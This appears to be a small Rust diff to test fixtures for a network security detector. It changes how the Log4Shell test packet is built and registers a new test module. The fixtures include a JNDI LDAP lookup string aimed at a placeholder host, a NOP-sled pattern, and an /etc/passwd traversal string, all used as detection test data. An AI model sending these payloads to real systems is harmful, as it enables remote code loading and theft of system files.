@@ -28,7 +28,7 @@ fn packet(protocol: &str, destination_port: u16, info: &str, bytes: Vec<u8>) -> 
 fn fixture(name: &str) -> Packet {
     match name {
         "Log4Shell (CVE-2021-44228)" => {
-            packet("HTTP", 8080, "", b"${jndi:ldap://example.test/x}".to_vec())
+            ipv4_tcp_packet(1, 100, 0x18, b"${jndi:ldap://example.test/x}")
         }
         "Shellcode NOP sled" => packet("TCP", 4444, "", vec![0x90; 20]),
         "Directory Traversal" => packet("HTTP", 80, "", b"../../../../../../etc/passwd".to_vec()),
@@ -273,5 +273,7 @@ mod cases_2;
 mod cases_3;
 #[path = "security_policy/dhcp_cases.rs"]
 mod dhcp_cases;
+#[path = "security_policy/lookup_marker_cases.rs"]
+mod lookup_marker_cases;
 #[path = "security_policy/tcp_reset_cases.rs"]
 mod tcp_reset_cases;
